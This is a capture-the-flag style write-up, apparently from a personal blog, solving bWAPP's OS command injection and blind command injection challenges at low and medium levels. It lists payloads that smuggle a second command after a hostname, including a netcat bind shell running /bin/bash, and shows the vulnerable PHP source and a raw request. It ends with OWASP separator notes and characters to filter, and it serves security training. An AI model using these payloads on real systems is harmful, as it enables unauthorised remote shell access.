---
title: "BWAPP OS Command Injection /Blind"
date: 2019-01-21 00:00:00 +0530
categories: [Writeups]
tags: [Bwapp]
description: "BWAPP OS Command Injection /Blind solution"
permalink: /Writeups/bwapp-os-injection/
redirect_from:
  - /bwapp-os-injection
  - /bwapp-os-injection/
archived: true
---


# BWAPP A1 - Injection


## OS Command Injection:

### LOW LEVEL :

payloads can be,
```
www.mukhilan.com && ls
www.mukhilan.com && nc -lvp 4444 -e /bin/bash
```

### MEDIUM LEVEL :

```
www.mukhilan.com | ls
www.mukhilan.com | nc -lvp 4444 -e /bin/bash
```
To get a shell, execute `nc -vn *ip* 4444`.

The source code is,
```
echo "<p align=\"left\">" . shell_exec("nslookup  " . commandi($target)) . "</p>";
```

## BWAPP OS Command Injection - Blind:

In blind os injection, 1st structure the os injection. For that, Header is as below.

```
POST /bWAPP/commandi_blind.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/bWAPP/commandi_blind.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Cookie: security_level=1; PHPSESSID=0gn1tu251ra9e9nbjqrf2n3v9u
Connection: close
Upgrade-Insecure-Requests: 1

target=127.0.0.1&form=submit
```

In this, there is no field to show the output.So, payload should be as follows.

### LOW LEVEL :

```
www.mukhilan.com && nc -lvp 4444 -e /bin/bash
```

### MEDIUM LEVEL : 

```
www.mukhilan.com | nc -lvp 4444 -e /bin/bash
```

To get a shell, execute `nc -vn *ip* 4444`.

The Source code is,
```
shell_exec("ping -c 1 " . commandi($target));
```


Useful info for payload from owasp,

  *  cmd1 `|` cmd2  : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.
  *  cmd1 `;` cmd2  : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.
  *  cmd1 `||` cmd2  : Command 2 will only be executed if command 1 execution fails.
  *  cmd1 `&&` cmd2 : Command 2 will only be executed if command 1 execution succeeds.
  *  $(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
  *  'cmd' : It's used to execute specific command. For example, 'whoami'

To prevent,
Escape or filter special characters for windows,  ``` ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , ` ```
Escape or filter special characters for Linux, ``` { }  ( ) < > & * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , ` ```

## Reference

```
https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
```
